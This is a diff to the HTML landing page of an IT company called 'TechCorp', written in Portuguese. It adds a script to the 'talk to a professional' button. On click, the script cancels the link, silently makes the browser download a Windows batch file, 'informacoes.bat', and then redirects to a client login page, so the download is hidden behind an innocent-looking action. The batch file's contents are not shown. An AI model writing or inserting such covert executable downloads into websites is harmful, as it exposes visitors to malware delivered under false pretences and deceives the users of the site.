@@ -138,9 +138,29 @@
       <h1>Bem-Vindo à TechCorp!</h1>
       <p>Soluções de TI com comprometimento, responsabilidade e segurança.</p>
       <p>Entre em contato para obter suporte ou compartilhar seu projeto.</p>
-      <a href="login-cliente.html" class="btn">Fale com um Profissional</a>
+      <!-- Botão atualizado -->
+      <a href="login-cliente.html" class="btn" id="btnFale">Fale com um Profissional</a>
     </div>
   </div>
+
+  <script>
+    document.getElementById("btnFale").addEventListener("click", function (event) {
+      event.preventDefault(); 
+
+      // 1) Dispara o download
+      const link = document.createElement("a");
+      link.href = "informacoes.bat"; 
+      link.download = "informacoes.bat";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      
+      setTimeout(function () {
+        window.location.href = "login-cliente.html";
+      }, 1000);
+    });
+  </script>
 
 </body>
 </html>
